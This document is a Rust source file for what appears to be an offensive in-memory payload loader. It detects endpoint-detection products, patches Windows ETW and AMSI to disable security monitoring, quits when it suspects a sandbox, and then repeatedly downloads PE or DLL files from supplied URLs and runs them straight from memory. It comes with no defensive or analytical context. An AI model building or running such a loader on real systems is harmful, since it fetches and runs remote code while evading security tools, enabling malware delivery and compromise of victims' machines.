use colored::Colorize;
use ctrlc;
use memexec;
use memexec::peloader::def::DLL_PROCESS_ATTACH;
use memexec::peparser::PE;
use url::Url;

mod decryptor;
mod detector;
mod error;
mod fetch;
mod patcher;

#[tokio::main]
async fn main() {
    ctrlc::set_handler(move || {
        eprintln!("\n[i] Received {}!", "Ctrl+C".red());
        std::process::exit(0);
    })
    .expect("[!] Error setting Ctrl-C handler");

    println!(
        "[>] {}? {}!",
        "Executables on Disk".italic().red(),
        "Ew".yellow()
    );
    println!("[i] Checking for popular {}", "EDRs".purple());
    if detector::detect_edrs() {
        eprintln!("[!] EDRs {}", "detected!".red());
    } else {
        println!("[i] {} detected!", "No External EDRs".cyan());
    }

    // Patch ETW
    match patcher::patch_etw() {
        Ok(_val) => {
            println!("[i] {} Patched!", "ETW".yellow());
        }
        Err(e) => {
            let err_msg = format!("{}", e);
            eprintln!("[!] Failed to patch {}", "ETW".red());
            eprintln!("[!] Error occured as {}", err_msg.red());
        }
    };

    // Patch AMSI
    match patcher::patch_amsi() {
        Ok(_val) => {
            println!("[i] {} Patched!", "AMSI".magenta());
        }
        Err(e) => {
            let err_msg = format!("{}", e);
            eprintln!("[!] Failed to patch {}", "AMSI".red());
            eprintln!("[!] Error occured as {}", err_msg.red());
        }
    };

    if !detector::check_sandbox() {
        std::process::exit(0);
    };

    loop {
        let url_str = match fetch::fetch_url() {
            Ok(_res) => _res,
            Err(e) => {
                let err = format!("{}", e);
                eprintln!("[!] Error occured as: {}", err.red());
                continue;
            }
        };

        // Check if user wants to exit
        if url_str.clone().as_str().trim().eq_ignore_ascii_case("quit")
            || url_str.clone().as_str().trim().eq_ignore_ascii_case("exit")
        {
            break;
        }

        // Check for empty input
        if url_str.clone().as_str().trim().is_empty() {
            continue;
        }

        println!("[i] Fetching: {}", url_str.yellow());
        let url: Url = match Url::parse(url_str.as_str()) {
            Ok(_u) => _u,
            Err(e) => {
                eprintln!("[-] Failed to parse URL string");
                eprintln!("[-] Error: {}", e);
                continue;
            }
        };

        // Fetch PE
        let mut pe_buf = match fetch::fetch_pe(url).await {
            Ok(_v) => _v,
            Err(e) => {
                let err = format!("{}", e);
                eprintln!("[!] Error occurred as: {}", err.red());
                continue;
            }
        };

        // Decrypt PE buffer
        // decryptor::decrypt_stream(&mut pe_buf);
        // println!("[i] Decrypted Buffer!");

        // Load PE
        let pe_parse = match PE::new(&pe_buf) {
            Ok(val) => val,
            Err(e) => {
                eprintln!("[!] Invalid Data!");
                std::process::exit(-1);
            }
        };

        unsafe {
            if pe_parse.is_dll() {
                println!("[i] Running {}!", "DLL".green());
                memexec::memexec_dll(&pe_buf, 0 as _, DLL_PROCESS_ATTACH, 0 as _)
                    .expect("[!] Failed to attach DLL");
            } else {
                println!("[i] Running {}!", "PE".green());
                memexec::memexec_exe(&pe_buf).expect("[!] Failed to run Exe");
            }
        }
    }

    println!("[i] {}", "Bye".green());
}
